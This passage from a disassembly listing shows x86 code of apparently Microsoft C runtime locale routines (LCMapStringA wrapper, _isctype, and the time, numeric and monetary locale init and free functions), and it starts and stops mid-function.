		and	[ebp+ms_exc.disabled], 0
		add	eax, 3
		and	eax, 0FFFFFFFCh
		call	__chkstk
		mov	[ebp+ms_exc.old_esp], esp
		mov	ebx, esp
		mov	[ebp+var_44], ebx
		mov	ecx, esi
		xor	eax, eax
		mov	edi, ebx
		mov	edx, ecx
		shr	ecx, 2
		rep stosd
		mov	ecx, edx
		and	ecx, 3
		rep stosb
		jmp	short loc_10083DD
; ---------------------------------------------------------------------------

loc_10083CF:				; DATA XREF: .text:stru_1002370o
		xor	eax, eax	; Exception filter 0 for function 10080C9
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_10083D3:				; DATA XREF: .text:stru_1002370o
		mov	esp, [ebp+ms_exc.old_esp] ; Exception handler 0	for function 10080C9
		call	__resetstkoflw
		xor	ebx, ebx

loc_10083DD:				; CODE XREF: ___crtLCMapStringA+304j
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		test	ebx, ebx
		jnz	short loc_1008410
		push	[ebp+Size]	; Size
		call	_malloc
		pop	ecx
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_100842D
		mov	ecx, [ebp+Size]
		xor	eax, eax
		mov	edi, ebx
		mov	edx, ecx
		shr	ecx, 2
		rep stosd
		mov	ecx, edx
		and	ecx, 3
		rep stosb
		mov	[ebp+var_3C], 1

loc_1008410:				; CODE XREF: ___crtLCMapStringA+31Aj
		push	[ebp+Size]	; cchDest
		push	ebx		; lpDestStr
		push	[ebp+cchSrc]	; cchSrc
		push	[ebp+var_28]	; lpSrcStr
		push	[ebp+dwMapFlags] ; dwMapFlags
		push	[ebp+Locale]	; Locale
		call	ds:__imp__LCMapStringA@24 ; LCMapStringA(x,x,x,x,x,x)
		mov	[ebp+Size], eax
		test	eax, eax
		jnz	short loc_1008431

loc_100842D:				; CODE XREF: ___crtLCMapStringA+2D3j
					; ___crtLCMapStringA+329j
		xor	esi, esi
		jmp	short loc_1008452
; ---------------------------------------------------------------------------

loc_1008431:				; CODE XREF: ___crtLCMapStringA+362j
		push	[ebp+cchDest]	; int
		push	[ebp+lpDestStr]	; int
		lea	eax, [ebp+Size]
		push	eax		; int
		push	ebx		; lpMultiByteStr
		push	[ebp+CodePage]	; int
		push	[ebp+var_40]	; CodePage
		call	___convertcp
		add	esp, 18h
		mov	esi, eax
		neg	esi
		sbb	esi, esi
		neg	esi

loc_1008452:				; CODE XREF: ___crtLCMapStringA+366j
		cmp	[ebp+var_3C], 0
		jz	short loc_100847B
		push	ebx		; Memory
		call	_free
		pop	ecx
		jmp	short loc_100847B
; ---------------------------------------------------------------------------

loc_1008461:				; CODE XREF: ___crtLCMapStringA+298j
		push	[ebp+cchDest]	; cchDest
		push	[ebp+lpDestStr]	; lpDestStr
		push	[ebp+cchSrc]	; cchSrc
		push	[ebp+lpMultiByteStr] ; lpSrcStr
		push	[ebp+dwMapFlags] ; dwMapFlags
		push	[ebp+Locale]	; Locale
		call	ds:__imp__LCMapStringA@24 ; LCMapStringA(x,x,x,x,x,x)
		mov	esi, eax

loc_100847B:				; CODE XREF: ___crtLCMapStringA+38Dj
					; ___crtLCMapStringA+396j
		cmp	[ebp+var_28], 0
		jz	short loc_100848A
		push	[ebp+var_28]	; Memory
		call	_free
		pop	ecx

loc_100848A:				; CODE XREF: ___crtLCMapStringA+3B6j
		mov	eax, esi

loc_100848C:				; CODE XREF: ___crtLCMapStringA+256j
					; ___crtLCMapStringA+290j
		lea	esp, [ebp-50h]
		call	__SEH_epilog
		retn
___crtLCMapStringA endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl _isctype(int C, int Type)
__isctype	proc near		; CODE XREF: _toupper+3Ep _tolower+42p ...

MultiByteStr	= byte ptr -4
var_3		= byte ptr -3
var_2		= byte ptr -2
CharType	= word ptr  8
Type		= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ecx
		mov	eax, dword ptr [ebp+CharType]
		lea	ecx, [eax+1]
		cmp	ecx, 100h
		ja	short loc_10084BA
		mov	ecx, __pctype
		movzx	eax, word ptr [ecx+eax*2]
		jmp	short loc_1008515
; ---------------------------------------------------------------------------

loc_10084BA:				; CODE XREF: __isctype+12j
		mov	ecx, eax
		sar	ecx, 8
		push	esi
		mov	esi, __pctype
		movzx	edx, cl
		test	byte ptr [esi+edx*2+1],	80h
		pop	esi
		jz	short loc_10084E0
		push	2
		mov	[ebp+var_3], al
		mov	[ebp+MultiByteStr], cl
		mov	[ebp+var_2], 0
		pop	eax
		jmp	short loc_10084EA
; ---------------------------------------------------------------------------

loc_10084E0:				; CODE XREF: __isctype+35j
		mov	[ebp+MultiByteStr], al
		xor	eax, eax
		mov	[ebp+var_3], 0
		inc	eax

loc_10084EA:				; CODE XREF: __isctype+44j
		push	1		; int
		push	dword_10106FC	; Locale
		lea	ecx, [ebp+0Ah]
		push	___lc_codepage	; CodePage
		push	ecx		; lpCharType
		push	eax		; cchSrc
		lea	eax, [ebp+MultiByteStr]
		push	eax		; lpMultiByteStr
		push	1		; dwInfoType
		call	___crtGetStringTypeA
		add	esp, 1Ch
		test	eax, eax
		jnz	short loc_1008511
		leave
		retn
; ---------------------------------------------------------------------------

loc_1008511:				; CODE XREF: __isctype+73j
		movzx	eax, word ptr [ebp+0Ah]

loc_1008515:				; CODE XREF: __isctype+1Ej
		and	eax, [ebp+Type]
		leave
		retn
__isctype	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_100851F	proc near		; CODE XREF: ___init_time:loc_1008A48p

var_8		= dword	ptr -8
Locale		= dword	ptr -4

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		test	esi, esi
		movzx	eax, word_1010766
		movzx	ecx, word_1010768
		mov	[ebp+Locale], eax
		mov	[ebp+var_8], ecx
		jnz	short loc_1008543
		or	eax, 0FFFFFFFFh
		leave
		retn
; ---------------------------------------------------------------------------

loc_1008543:				; CODE XREF: sub_100851F+1Dj
		push	ebx
		push	edi
		lea	ecx, [esi+4]
		push	ecx		; int
		push	31h		; LCType
		xor	ebx, ebx
		push	eax		; Locale
		inc	ebx
		push	ebx		; int
		call	___getlocaleinfo
		mov	edi, eax
		lea	eax, [esi+8]
		push	eax		; int
		push	32h		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+0Ch]
		push	eax		; int
		push	33h		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+10h]
		push	eax		; int
		push	34h		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		add	esp, 40h
		or	edi, eax
		lea	eax, [esi+14h]
		push	eax		; int
		push	35h		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+18h]
		push	eax		; int
		push	36h		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		push	esi		; int
		push	37h		; LCType
		push	[ebp+Locale]	; Locale
		or	edi, eax
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+20h]
		push	eax		; int
		push	2Ah		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		add	esp, 40h
		or	edi, eax
		lea	eax, [esi+24h]
		push	eax		; int
		push	2Bh		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+28h]
		push	eax		; int
		push	2Ch		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+2Ch]
		push	eax		; int
		push	2Dh		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+30h]
		push	eax		; int
		push	2Eh		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		add	esp, 40h
		or	edi, eax
		lea	eax, [esi+34h]
		push	eax		; int
		push	2Fh		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+1Ch]
		push	eax		; int
		push	30h		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+38h]
		push	eax		; int
		push	44h		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+3Ch]
		push	eax		; int
		push	45h		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		add	esp, 40h
		or	edi, eax
		lea	eax, [esi+40h]
		push	eax		; int
		push	46h		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+44h]
		push	eax		; int
		push	47h		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+48h]
		push	eax		; int
		push	48h		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+4Ch]
		push	eax		; int
		push	49h		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		add	esp, 40h
		or	edi, eax
		lea	eax, [esi+50h]
		push	eax		; int
		push	4Ah		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+54h]
		push	eax		; int
		push	4Bh		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+58h]
		push	eax		; int
		push	4Ch		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+5Ch]
		push	eax		; int
		push	4Dh		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		add	esp, 40h
		or	edi, eax
		lea	eax, [esi+60h]
		push	eax		; int
		push	4Eh		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+64h]
		push	eax		; int
		push	4Fh		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+68h]
		push	eax		; int
		push	38h		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+6Ch]
		push	eax		; int
		push	39h		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		add	esp, 40h
		or	edi, eax
		lea	eax, [esi+70h]
		push	eax		; int
		push	3Ah		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+74h]
		push	eax		; int
		push	3Bh		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+78h]
		push	eax		; int
		push	3Ch		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+7Ch]
		push	eax		; int
		push	3Dh		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		add	esp, 40h
		or	edi, eax
		lea	eax, [esi+80h]
		push	eax		; int
		push	3Eh		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+84h]
		push	eax		; int
		push	3Fh		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+88h]
		push	eax		; int
		push	40h		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+8Ch]
		push	eax		; int
		push	41h		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		add	esp, 40h
		or	edi, eax
		lea	eax, [esi+90h]
		push	eax		; int
		push	42h		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+94h]
		push	eax		; int
		push	43h		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+98h]
		push	eax		; int
		push	28h		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+9Ch]
		push	eax		; int
		push	29h		; LCType
		push	[ebp+Locale]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		add	esp, 40h
		or	edi, eax
		lea	eax, [esi+0A0h]
		push	eax		; int
		push	1Fh		; LCType
		push	[ebp+var_8]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+0A4h]
		push	eax		; int
		push	20h		; LCType
		push	[ebp+var_8]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [esi+0A8h]
		push	eax		; int
		push	1003h		; LCType
		push	[ebp+var_8]	; Locale
		push	ebx		; int
		call	___getlocaleinfo
		mov	ebx, [ebp+var_8]
		or	edi, eax
		lea	eax, [esi+0B0h]
		push	eax		; int
		push	1009h		; LCType
		push	ebx		; Locale
		push	0		; int
		call	___getlocaleinfo
		add	esp, 40h
		or	edi, eax
		mov	[esi+0ACh], ebx
		mov	eax, edi
		pop	edi
		pop	ebx
		leave
		retn
sub_100851F	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

___free_lc_time	proc near		; CODE XREF: ___init_time+2Bp
					; ___init_time+47p ...

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, [ebp+arg_0]
		test	esi, esi
		jz	loc_1008A1F
		push	dword ptr [esi+4] ; Memory
		call	_free
		push	dword ptr [esi+8] ; Memory
		call	_free
		push	dword ptr [esi+0Ch] ; Memory
		call	_free
		push	dword ptr [esi+10h] ; Memory
		call	_free
		push	dword ptr [esi+14h] ; Memory
		call	_free
		push	dword ptr [esi+18h] ; Memory
		call	_free
		push	dword ptr [esi]	; Memory
		call	_free
		push	dword ptr [esi+20h] ; Memory
		call	_free
		push	dword ptr [esi+24h] ; Memory
		call	_free
		push	dword ptr [esi+28h] ; Memory
		call	_free
		push	dword ptr [esi+2Ch] ; Memory
		call	_free
		push	dword ptr [esi+30h] ; Memory
		call	_free
		push	dword ptr [esi+34h] ; Memory
		call	_free
		push	dword ptr [esi+1Ch] ; Memory
		call	_free
		push	dword ptr [esi+38h] ; Memory
		call	_free
		push	dword ptr [esi+3Ch] ; Memory
		call	_free
		add	esp, 40h
		push	dword ptr [esi+40h] ; Memory
		call	_free
		push	dword ptr [esi+44h] ; Memory
		call	_free
		push	dword ptr [esi+48h] ; Memory
		call	_free
		push	dword ptr [esi+4Ch] ; Memory
		call	_free
		push	dword ptr [esi+50h] ; Memory
		call	_free
		push	dword ptr [esi+54h] ; Memory
		call	_free
		push	dword ptr [esi+58h] ; Memory
		call	_free
		push	dword ptr [esi+5Ch] ; Memory
		call	_free
		push	dword ptr [esi+60h] ; Memory
		call	_free
		push	dword ptr [esi+64h] ; Memory
		call	_free
		push	dword ptr [esi+68h] ; Memory
		call	_free
		push	dword ptr [esi+6Ch] ; Memory
		call	_free
		push	dword ptr [esi+70h] ; Memory
		call	_free
		push	dword ptr [esi+74h] ; Memory
		call	_free
		push	dword ptr [esi+78h] ; Memory
		call	_free
		push	dword ptr [esi+7Ch] ; Memory
		call	_free
		add	esp, 40h
		push	dword ptr [esi+80h] ; Memory
		call	_free
		push	dword ptr [esi+84h] ; Memory
		call	_free
		push	dword ptr [esi+88h] ; Memory
		call	_free
		push	dword ptr [esi+8Ch] ; Memory
		call	_free
		push	dword ptr [esi+90h] ; Memory
		call	_free
		push	dword ptr [esi+94h] ; Memory
		call	_free
		push	dword ptr [esi+98h] ; Memory
		call	_free
		push	dword ptr [esi+9Ch] ; Memory
		call	_free
		push	dword ptr [esi+0A0h] ; Memory
		call	_free
		push	dword ptr [esi+0A4h] ; Memory
		call	_free
		push	dword ptr [esi+0A8h] ; Memory
		call	_free
		add	esp, 2Ch

loc_1008A1F:				; CODE XREF: ___free_lc_time+Bj
		pop	esi
		pop	ebp
		retn
___free_lc_time	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


___init_time	proc near		; DATA XREF: .data:0100E21Co
		cmp	dword_1010708, 0
		push	esi
		jz	short loc_1008A86
		push	0B4h		; SizeOfElements
		push	1		; NumOfElements
		call	_calloc
		mov	esi, eax
		test	esi, esi
		pop	ecx
		pop	ecx
		jnz	short loc_1008A48
		inc	eax
		pop	esi
		retn
; ---------------------------------------------------------------------------

loc_1008A48:				; CODE XREF: ___init_time+1Cj
		call	sub_100851F
		test	eax, eax
		jz	short loc_1008A62
		push	esi
		call	___free_lc_time
		push	esi		; Memory
		call	_free
		xor	eax, eax
		inc	eax
		jmp	short loc_1008AAF
; ---------------------------------------------------------------------------

loc_1008A62:				; CODE XREF: ___init_time+28j
		push	___lc_time_intl
		mov	___lc_time_curr, esi
		call	___free_lc_time
		push	___lc_time_intl	; Memory
		call	_free
		mov	___lc_time_intl, esi
		jmp	short loc_1008AAD
; ---------------------------------------------------------------------------

loc_1008A86:				; CODE XREF: ___init_time+8j
		push	___lc_time_intl
		mov	___lc_time_curr, offset	___lc_time_c
		call	___free_lc_time
		push	___lc_time_intl	; Memory
		call	_free
		and	___lc_time_intl, 0

loc_1008AAD:				; CODE XREF: ___init_time+5Dj
		xor	eax, eax

loc_1008AAF:				; CODE XREF: ___init_time+39j
		pop	ecx
		pop	ecx
		pop	esi
		retn
___init_time	endp

; ---------------------------------------------------------------------------
		align 8

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

___free_lconv_num proc near		; CODE XREF: ___init_numeric+21p
					; ___init_numeric+B1p ...

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, [ebp+arg_0]
		test	esi, esi
		jz	short loc_1008AFA
		mov	eax, [esi]
		cmp	eax, ___lconv_c
		jz	short loc_1008AD6
		push	eax		; Memory
		call	_free
		pop	ecx

loc_1008AD6:				; CODE XREF: ___free_lconv_num+15j
		mov	eax, [esi+4]
		cmp	eax, off_100E7E4
		jz	short loc_1008AE8
		push	eax		; Memory
		call	_free
		pop	ecx

loc_1008AE8:				; CODE XREF: ___free_lconv_num+27j
		mov	esi, [esi+8]
		cmp	esi, off_100E7E8
		jz	short loc_1008AFA
		push	esi		; Memory
		call	_free
		pop	ecx

loc_1008AFA:				; CODE XREF: ___free_lconv_num+Bj
					; ___free_lconv_num+39j
		pop	esi
		pop	ebp
		retn
___free_lconv_num endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

___init_numeric	proc near		; DATA XREF: .data:0100E210o

var_4		= dword	ptr -4

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		xor	esi, esi
		cmp	dword_1010704, esi
		push	edi
		jnz	short loc_1008B43
		cmp	dword_1010700, esi
		jnz	short loc_1008B43
		push	___lconv
		call	___free_lconv_num
		push	___lconv_intl	; Memory
		call	_free
		mov	ebx, offset ___lconv_c
		mov	___lconv_intl, esi
		jmp	loc_1008C2D
; ---------------------------------------------------------------------------

loc_1008B43:				; CODE XREF: ___init_numeric+11j
					; ___init_numeric+19j
		push	30h		; SizeOfElements
		push	1		; NumOfElements
		call	_calloc
		mov	ebx, eax
		cmp	ebx, esi
		pop	ecx
		pop	ecx
		jnz	short loc_1008B5C
		xor	eax, eax
		inc	eax
		jmp	loc_1008C4A
; ---------------------------------------------------------------------------

loc_1008B5C:				; CODE XREF: ___init_numeric+50j
		mov	esi, ___lconv
		push	0Ch
		pop	ecx
		mov	edi, ebx
		rep movsd
		cmp	dword_1010704, 0
		jz	loc_1008BFA
		movzx	esi, word_1010762
		push	ebx		; int
		push	0Eh		; LCType
		push	esi		; Locale
		push	1		; int
		call	___getlocaleinfo
		mov	[ebp+var_4], eax
		lea	eax, [ebx+4]
		push	eax		; int
		push	0Fh		; LCType
		push	esi		; Locale
		push	1		; int
		call	___getlocaleinfo
		or	[ebp+var_4], eax
		lea	edi, [ebx+8]
		push	edi		; int
		push	10h		; LCType
		push	esi		; Locale
		push	1		; int
		call	___getlocaleinfo
		add	esp, 30h
		or	eax, [ebp+var_4]
		jz	short loc_1008BC6
		push	ebx
		call	___free_lconv_num
		push	ebx		; Memory
		call	_free
		or	eax, 0FFFFFFFFh
		jmp	loc_1008C48
; ---------------------------------------------------------------------------

loc_1008BC6:				; CODE XREF: ___init_numeric+AEj
		mov	eax, [edi]
		jmp	short loc_1008BDC
; ---------------------------------------------------------------------------

loc_1008BCA:				; CODE XREF: ___init_numeric+DDj
		mov	cl, [eax]
		cmp	cl, 30h
		jl	short loc_1008BE3
		cmp	cl, 39h
		jg	short loc_1008BE3
		sub	cl, 30h
		mov	[eax], cl

loc_1008BDB:				; CODE XREF: ___init_numeric+E4j
		inc	eax

loc_1008BDC:				; CODE XREF: ___init_numeric+C6j
					; ___init_numeric+F6j
		cmp	byte ptr [eax],	0
		jnz	short loc_1008BCA
		jmp	short loc_1008C11
; ---------------------------------------------------------------------------

loc_1008BE3:				; CODE XREF: ___init_numeric+CDj
					; ___init_numeric+D2j
		cmp	cl, 3Bh
		jnz	short loc_1008BDB
		mov	esi, eax

loc_1008BEA:				; CODE XREF: ___init_numeric+F4j
		lea	edi, [esi+1]
		mov	cl, [edi]
		mov	[esi], cl
		mov	esi, edi
		cmp	byte ptr [esi],	0
		jnz	short loc_1008BEA
		jmp	short loc_1008BDC
; ---------------------------------------------------------------------------

loc_1008BFA:				; CODE XREF: ___init_numeric+6Ej
		mov	eax, ___lconv_c
		mov	[ebx], eax
		mov	eax, off_100E7E4
		mov	[ebx+4], eax
		mov	eax, off_100E7E8
		mov	[ebx+8], eax

loc_1008C11:				; CODE XREF: ___init_numeric+DFj
		push	___lconv
		call	___free_lconv_num
		push	___lconv_intl	; Memory
		call	_free
		mov	___lconv_intl, ebx

loc_1008C2D:				; CODE XREF: ___init_numeric+3Cj
		mov	___lconv, ebx
		mov	eax, [ebx]
		mov	al, [eax]
		mov	___decimal_point, al
		mov	___decimal_point_length, 1
		xor	eax, eax

loc_1008C48:				; CODE XREF: ___init_numeric+BFj
		pop	ecx
		pop	ecx

loc_1008C4A:				; CODE XREF: ___init_numeric+55j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
___init_numeric	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

___free_lconv_mon proc near		; CODE XREF: ___init_monetary+1Dp
					; ___init_monetary+169p ...

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, [ebp+arg_0]
		test	esi, esi
		jz	short loc_1008CDF
		mov	eax, [esi+0Ch]
		cmp	eax, off_100E7EC
		jz	short loc_1008C73
		push	eax		; Memory
		call	_free
		pop	ecx

loc_1008C73:				; CODE XREF: ___free_lconv_mon+16j
		mov	eax, [esi+10h]
		cmp	eax, off_100E7F0
		jz	short loc_1008C85
		push	eax		; Memory
		call	_free
		pop	ecx

loc_1008C85:				; CODE XREF: ___free_lconv_mon+28j
		mov	eax, [esi+14h]
		cmp	eax, off_100E7F4
		jz	short loc_1008C97
		push	eax		; Memory
		call	_free
		pop	ecx

loc_1008C97:				; CODE XREF: ___free_lconv_mon+3Aj
		mov	eax, [esi+18h]
		cmp	eax, off_100E7F8
		jz	short loc_1008CA9
		push	eax		; Memory
		call	_free
		pop	ecx

loc_1008CA9:				; CODE XREF: ___free_lconv_mon+4Cj
		mov	eax, [esi+1Ch]
		cmp	eax, off_100E7FC
		jz	short loc_1008CBB
		push	eax		; Memory
		call	_free
		pop	ecx

loc_1008CBB:				; CODE XREF: ___free_lconv_mon+5Ej
		mov	eax, [esi+20h]
		cmp	eax, off_100E800
		jz	short loc_1008CCD
		push	eax		; Memory
		call	_free
		pop	ecx

loc_1008CCD:				; CODE XREF: ___free_lconv_mon+70j
		mov	esi, [esi+24h]
		cmp	esi, off_100E804
		jz	short loc_1008CDF
		push	esi		; Memory
		call	_free
		pop	ecx

loc_1008CDF:				; CODE XREF: ___free_lconv_mon+Bj
					; ___free_lconv_mon+82j
		pop	esi
		pop	ebp
		retn
___free_lconv_mon endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


___init_monetary proc near		; DATA XREF: .data:0100E204o
		mov	edi, edi
		push	ebx
		push	esi
		xor	esi, esi
		cmp	dword_1010700, esi
		push	edi
		jnz	short loc_1008D29
		cmp	dword_1010704, esi
		jnz	short loc_1008D29
		push	___lconv_intl
		call	___free_lconv_mon
		push	___lconv_intl	; Memory
		call	_free
		mov	___lconv, offset ___lconv_c
		mov	___lconv_intl, esi
		jmp	loc_1008EE7
; ---------------------------------------------------------------------------

loc_1008D29:				; CODE XREF: ___init_monetary+Dj
					; ___init_monetary+15j
		push	30h		; SizeOfElements
		push	1		; NumOfElements
		call	_calloc
		mov	ebx, eax
		cmp	ebx, esi
		pop	ecx
		pop	ecx
		jz	loc_1008E5D
		cmp	dword_1010700, esi
		jz	loc_1008E9A
		movzx	esi, word_101075C
		lea	eax, [ebx+0Ch]
		push	eax		; int
		push	15h		; LCType
		push	esi		; Locale
		push	1		; int
		call	___getlocaleinfo
		mov	edi, eax
		lea	eax, [ebx+10h]
		push	eax		; int
		push	14h		; LCType
		push	esi		; Locale
		push	1		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [ebx+14h]
		push	eax		; int
		push	16h		; LCType
		push	esi		; Locale
		push	1		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [ebx+18h]
		push	eax		; int
		push	17h		; LCType
		push	esi		; Locale
		push	1		; int
		call	___getlocaleinfo
		add	esp, 40h
		or	edi, eax
		lea	eax, [ebx+1Ch]
		push	eax		; int
		push	18h		; LCType
		push	esi		; Locale
		push	1		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [ebx+20h]
		push	eax		; int
		push	50h		; LCType
		push	esi		; Locale
		push	1		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [ebx+24h]
		push	eax		; int
		push	51h		; LCType
		push	esi		; Locale
		push	1		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [ebx+28h]
		push	eax		; int
		push	1Ah		; LCType
		push	esi		; Locale
		push	0		; int
		call	___getlocaleinfo
		add	esp, 40h
		or	edi, eax
		lea	eax, [ebx+29h]
		push	eax		; int
		push	19h		; LCType
		push	esi		; Locale
		push	0		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [ebx+2Ah]
		push	eax		; int
		push	54h		; LCType
		push	esi		; Locale
		push	0		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [ebx+2Bh]
		push	eax		; int
		push	55h		; LCType
		push	esi		; Locale
		push	0		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [ebx+2Ch]
		push	eax		; int
		push	56h		; LCType
		push	esi		; Locale
		push	0		; int
		call	___getlocaleinfo
		add	esp, 40h
		or	edi, eax
		lea	eax, [ebx+2Dh]
		push	eax		; int
		push	57h		; LCType
		push	esi		; Locale
		push	0		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [ebx+2Eh]
		push	eax		; int
		push	52h		; LCType
		push	esi		; Locale
		push	0		; int
		call	___getlocaleinfo
		or	edi, eax
		lea	eax, [ebx+2Fh]
		push	eax		; int
		push	53h		; LCType
		push	esi		; Locale
		push	0		; int
		call	___getlocaleinfo
		add	esp, 30h
		or	eax, edi
		jz	short loc_1008E65
		push	ebx
		call	___free_lconv_mon
		push	ebx		; Memory
		call	_free
		pop	ecx
		pop	ecx

loc_1008E5D:				; CODE XREF: ___init_monetary+51j
		xor	eax, eax
		inc	eax
		jmp	loc_1008EEB
; ---------------------------------------------------------------------------

loc_1008E65:				; CODE XREF: ___init_monetary+166j
		mov	eax, [ebx+1Ch]
		jmp	short loc_1008E7C
; ---------------------------------------------------------------------------

loc_1008E6A:				; CODE XREF: ___init_monetary+198j
		mov	cl, [eax]
		cmp	cl, 30h
		jl	short loc_1008E83
		cmp	cl, 39h
		jg	short loc_1008E83
		sub	cl, 30h
		mov	[eax], cl

loc_1008E7B:				; CODE XREF: ___init_monetary+19Fj
		inc	eax

loc_1008E7C:				; CODE XREF: ___init_monetary+181j
					; ___init_monetary+1B1j
		cmp	byte ptr [eax],	0
		jnz	short loc_1008E6A
		jmp	short loc_1008EA6
; ---------------------------------------------------------------------------

loc_1008E83:				; CODE XREF: ___init_monetary+188j
					; ___init_monetary+18Dj
		cmp	cl, 3Bh
		jnz	short loc_1008E7B
		mov	esi, eax

loc_1008E8A:				; CODE XREF: ___init_monetary+1AFj
